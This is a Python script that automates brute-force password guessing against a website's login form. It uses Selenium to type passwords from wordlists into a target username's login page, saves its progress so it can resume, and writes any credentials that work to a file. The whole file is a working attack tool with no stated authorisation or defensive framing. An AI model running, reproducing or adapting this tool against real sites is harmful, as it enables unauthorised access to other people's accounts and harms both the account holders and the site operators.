import os
import requests
import time as t
import logging
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.common.exceptions import NoSuchElementException, InvalidSelectorException, WebDriverException
from optparse import OptionParser


# Setup logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

# ChromeDriver path
CHROME_DVR_DIR = r'C:\webdrivers\chromedriver.exe'

def read_web_info(file_path='web_info.txt'):
    """Read key-value pairs from the web info file."""
    web_info = {}
    try:
        with open(file_path, 'r') as f:
            for line in f:
                key, value = line.strip().split(': ', 1)
                web_info[key] = value
    except FileNotFoundError as e:
        logging.error(f"Web info file not found: {e}")
        exit()
    except Exception as e:
        logging.error(f"Error reading web_info.txt: {str(e)}")
        exit()
    return web_info

def update_web_info(file_path='web_info.txt', updates={}):
    """Update key-value pairs in the web info file."""
    try:
        web_info = {}
        with open(file_path, 'r') as f:
            for line in f:
                key, value = line.strip().split(': ', 1)
                web_info[key] = value

        web_info.update(updates)

        with open(file_path, 'w') as f:
            for key, value in web_info.items():
                f.write(f"{key}: {value}\n")
    except Exception as e:
        logging.error(f"Error updating web_info.txt: {str(e)}")

def test_website_access(website):
    """Test if the website is accessible."""
    try:
        response = requests.get(website)
        if response.status_code == 200:
            logging.info("Website is accessible.")
        else:
            logging.error("Website is not accessible. Make sure to use http/https.")
            return False
    except Exception as e:
        logging.error(f"Website could not be reached: {str(e)}")
        return False
    return True

def log_valid_credential(username, password):
    """Log valid credentials to a file."""
    with open('valid_credentials.txt', 'a') as f:
        f.write(f"{username}: {password}\n")

def get_password_lists():
    """Retrieve all .txt files in the 'pw' directory, sorted by size."""
    pw_dir = 'pw'
    if not os.path.exists(pw_dir):
        logging.error(f"'{pw_dir}' directory not found.")
        return []

    # Retrieve all .txt files and sort them by size
    password_lists = sorted(
        [os.path.join(pw_dir, f) for f in os.listdir(pw_dir) if f.endswith('.txt')],
        key=lambda x: os.path.getsize(x),
        reverse=True
    )

    return password_lists

def read_tried_passwords(file_path='tried_passwords.txt'):
    """Retrieve passwords that have already been tried from a log file."""
    tried_passwords = set()
    if os.path.exists(file_path):
        with open(file_path, 'r') as f:
            tried_passwords = {line.strip() for line in f}
    return tried_passwords

def brutes(username, username_selector, password_selector, login_btn_selector, password_lists, website, current_positions):
    """Perform a brute-force attack with the given password lists."""
    options = Options()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")

    service = Service(CHROME_DVR_DIR)
    browser = webdriver.Chrome(service=service, options=options)

    # Retrieve passwords that have already been tried
    tried_passwords = read_tried_passwords()

    for idx, pass_path in enumerate(password_lists):
        # Retrieve current position from web_info.txt
        if pass_path not in current_positions:
            current_positions[pass_path] = 0

        try:
            with open(pass_path, 'r') as f:
                passwords = f.readlines()

        except FileNotFoundError:
            logging.error(f"Password list {os.path.basename(pass_path)} not found in 'pw' directory.")
            continue

        total_passwords = len(passwords)

        for i in range(current_positions[pass_path], total_passwords):
            password = passwords[i].strip()

            # Skip passwords that have already been tried
            if password in tried_passwords:
                continue

            try:
                browser.get(website)
                t.sleep(2)

                Sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
                Sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)

                Sel_user.send_keys(username)
                Sel_pas.send_keys(password)

                enter.click()
                t.sleep(5)

                # Update the position marker in web_info.txt
                current_positions[pass_path] = i + 1
                update_web_info(updates={f"{os.path.basename(pass_path)}_position": current_positions[pass_path]})

                # Log the tried password
                with open('tried_passwords.txt', 'a') as log_file:
                    log_file.write(f"{password}\n")

                # Check login success and log valid credentials
                if browser.current_url != website:
                    logging.info(f"Valid credentials found: {username} / {password}")
                    log_valid_credential(username, password)
                    exit()

                # Calculate progress percentage
                remaining_passwords = total_passwords - current_positions[pass_path]
                progress_percentage = 100 * (i + 1) / total_passwords

                logging.info(f"Tried password: {password} for user: {username}")
                logging.info(f"Progress: {progress_percentage:.2f}% ({remaining_passwords} passwords left)")
            except NoSuchElementException:
                logging.error("An element is missing, which could indicate either the password was found or you are locked out.")
                exit()
            except InvalidSelectorException:
                logging.error("An invalid selector was used. Check the selectors again.")
                exit()
            except WebDriverException:
                logging.error("An error occurred with WebDriver.")
                browser.quit()
                exit()
            except KeyboardInterrupt:
                logging.error("User interrupted with Ctrl-C.")
                exit()

def wizard():
    """Handle the overall brute-force attack through an interactive workflow."""
    web_info = read_web_info()

    website = web_info.get('website')
    if not website:
        logging.error("No website specified in web_info.txt")
        return

    if not test_website_access(website):
        return

    target_username = web_info.get('target_username', '')
    password_lists = get_password_lists()

    # Retrieve starting positions from web_info.txt
    current_positions = {
        path: int(web_info.get(f"{os.path.basename(path)}_position", 0))
        for path in password_lists
    }

    brutes(
        target_username,
        web_info['username_selector'],
        web_info['password_selector'],
        web_info['login_button_selector'],
        password_lists,
        website,
        current_positions
    )

# Argument parsing
parser = OptionParser()
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("--passlists", dest="passlists", help="Comma-separated list of password files")
parser.add_option("--website", help="Choose a website")
(options, args) = parser.parse_args()

if not (options.website and options.passlists):
    wizard()
else:
    web_info = read_web_info()
    password_lists = get_password_lists() if not options.passlists else options.passlists.split(',')

    # Retrieve starting positions from web_info.txt
    current_positions = {
        path: int(web_info.get(f"{os.path.basename(path)}_position", 0))
        for path in password_lists
    }

    brutes(
        web_info.get('target_username', ''),
        web_info['username_selector'],
        web_info['password_selector'],
        web_info['login_button_selector'],
        password_lists,
        options.website,
        current_positions
    )
